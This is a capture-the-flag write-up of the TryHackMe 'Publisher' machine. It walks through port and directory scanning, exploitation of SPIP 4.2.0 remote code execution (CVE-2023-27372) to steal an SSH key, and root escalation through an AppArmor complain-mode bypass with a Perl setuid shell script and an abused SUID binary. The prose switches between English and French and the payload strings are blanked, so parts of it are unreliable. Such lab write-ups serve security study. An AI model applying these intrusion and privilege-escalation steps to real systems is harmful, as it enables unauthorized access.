---
image: "/assets/img/posts/publisher_dad6c6f84d.jpg"
title: "Publisher Tryhackme"
description: "The machine"
pubDate: "2024-07-18"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconnaissance





To get started,. I use rustscan to see which ports are open in this machine





  `








```bash


# rustscan --ulimit 5000 --range 1-65535 -a $ip -- -sV 


.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.


| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |


| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |


`- `-`-----`----  `-  `----  `--- `-  `-`- `-


The Modern Day Port Scanner.


________________________________________


: http://discord.skerritt.blog         :


: https://github.com/RustScan/RustScan :


 --------------------------------------


😵 https://admin.tryhackme.com





[~] The config file is expected to be at "/root/.rustscan.toml"


[~] Automatically increasing ulimit value to 5000.


Open 10.10.83.157:22


Open 10.10.83.157:80





```


`





Two ports are open and which are:





Port: 22Port: 80





A website already available in port 80.





[![website](/assets/img/posts/spip_8b702b503e.png)](https://i.ibb.co/bbJbfw8/spip.png)





I'm going to do file enumeration on this site that I just discovered with ffuf





  `








```bash


└─$ ffuf -u http://10.10.83.157/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt





        /___\  /___\           /___\       


       /\ \__/ /\ \__/  __  __  /\ \__/       


       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      


        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      


         \ \_\   \ \_\  \ \____/  \ \_\       


          \/_/    \/_/   \/___/    \/_/       





       v2.1.0-dev


______________________





spip                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 967ms]


images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3598ms





```


`





On the website I find a CMS called SPIP with version 4.2.0





[SPIP v4.2.0 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/51536)  `








```bash


$ searchsploit -m 51536                


  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)


      URL: https://www.exploit-db.com/exploits/51536


     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py


    Codes: CVE-2023-27372


 Verified: True


File Type: Python script, ASCII text executable


Copied to: /home/MrR0807/CTFs/Boot2/TryHackMe/exploits/51536.py





$ python3 spip_rce.py -h


usage: spip_rce.py [-h] -u URL -c COMMAND [-v]





Poc of CVE-2023-27372 SPIP `





Lorsque jexecute cet exploit:





  `











```bash


$ python3 spip_rce.py -u http://10.10.83.157/spip -c id -v


[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx


[+] Execute this payload : s:35:"";


```bash


`





Reading this [nuclei template](https://github.com/projectdiscovery/nuclei-templates/pull/7510/files), I understand that the vulnerability resides in the password reset parameter during CMS login





[![Oubli](/assets/img/posts/oubli_62c2142b06.png)](https://i.ibb.co/z6NQhpf/oubli.png)





À partir de là, il est possible de formuler une commande by using la chaîne "s:19:"";"





[![calcule](/assets/img/posts/s3_64300fb493.png)](https://i.ibb.co/XWrWY80/s3.png)





Le s:35 indique ici le nombre de caractères contenus dans les guillemets “”. ""





[![passwd](/assets/img/posts/en_3fd2a028ba.png)](https://i.ibb.co/SBkqGTt/en.png)





jai lu la cle privee ssh by using le payload s:47:""; puis je me suis connecter en tant quutilisateur think





[![id_rsa](/assets/img/posts/ke_8c88c69896.png)](https://i.ibb.co/M6zZ03b/ke.png)





  `











```bash


└─$ ssh think@10.10.83.157 -i id_rsa 


think@publisher:~$ id


uid=1000(think) gid=1000(think) groups=1000(think)


```bash


`


## Privilege Escalation





Je commence par vérifier la version du système.





  `











```bash


think@publisher:~$ uname -a


Linux publisher 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


```bash


`





Inspecting the SUID binaries, I discover a file that looks suspicious.





[![suspect suid](/assets/img/posts/suid_423e6e7708.png)](https://i.ibb.co/KbPg5HH/suid.png)





I examine this suspicious file using the strings command, and here is what I find:





[![](/assets/img/posts/sc_e103d1bce5.png)](https://i.ibb.co/km0jdJ8/sc.png)





  `











```bash


think@publisher:/opt$ ls -la /opt/run_container.sh


-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh


think@publisher:/opt$


```bash


`





However, when trying to transfer files to the target machine, I encounter an access restriction preventing directory creation.





  `











```bash


think@publisher:/tmp$ mkdir priv


mkdir: cannot create directory priv: Permission denied


```bash


`





[![env](/assets/img/posts/env_97bd7ea586.png)](https://i.ibb.co/6W7Bqcm/env.png)





Examining environment variables, I observe that this system uses ash as its default shell, indicated by SHELL=/usr/sbin/ash





### AppArmor Shebang Bypass





> AppArmor is a Linux Security Module designed to restrict program capabilities through per-program security profiles, mettant en œuvre efficacement un contrôle daccès obligatoire (MAC) en liant directement les attributs de contrôle daccès aux programmes plutôt quaux utilisateurs.





En examinant le profil AppArmor associé au shell ash, on observe les règles suivantes :





[![](/assets/img/posts/as_293b6b3375.png)](https://i.ibb.co/frQ23jz/as.png)





According to the rules defined in this profile, write access to directories like /opt, /tmp, and /var/tmp is restricted. However, there is a subtle misconfiguration:





Mode "complain": The AppArmor profile for ash is configured in "complain" mode (`flags=(complain)`). In this mode, security rule violations are not strictly enforced; they are only logged without actively blocking access. This means write attempts to `/var/tmp` succeed despite profile definitions.

In "complain" mode, AppArmor protections are permissive, allowing attackers to bypass execution and write restrictions in `/var/tmp`.

To bypass the AppArmor Shebang restriction, I use the following script:











```bash


#!/usr/bin/perl


use POSIX qw(strftime);


use POSIX qw(setuid);


POSIX::setuid(0);


exec "/bin/sh"


```


`





I will write and run this script in the /var/tmp directory, which will allow me to bypass the restrictions imposed by AppArmor.





[![Bypass AppArmor](/assets/img/posts/bypass_fb449b7339.png)](https://i.ibb.co/j69skvC/bypass.png)





After having bypassed AppArmor, I can now write to the /opt/run_container.sh file without any restrictions, allowing me to elevate my privileges by using the SUID /usr/sbin/run_container.





[![ssh](/assets/img/posts/ssh_57bd57b94d.png)](https://i.ibb.co/gtnSwjc/ssh.png)





To finalize, I added my user's Public SSH key to the root user's authorized_keys file, allowing me to connect without a password.





[![Rooted](/assets/img/posts/root_a10cb7def8.png)](https://i.ibb.co/9tT6SS8/root.png)





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[Nuclei](https://github.com/projectdiscovery/nuclei-templates/pull/7510/files)[AppArmor Bypass](https://book.hacktricks.xyz/v/fr/linux-hardening/privilege-escalation/docker-security/apparmor)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Publisher%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpublisher-tryhackme%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Publisher%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpublisher-tryhackme%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpublisher-tryhackme%2F&text=Publisher%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpublisher-tryhackme%2F)


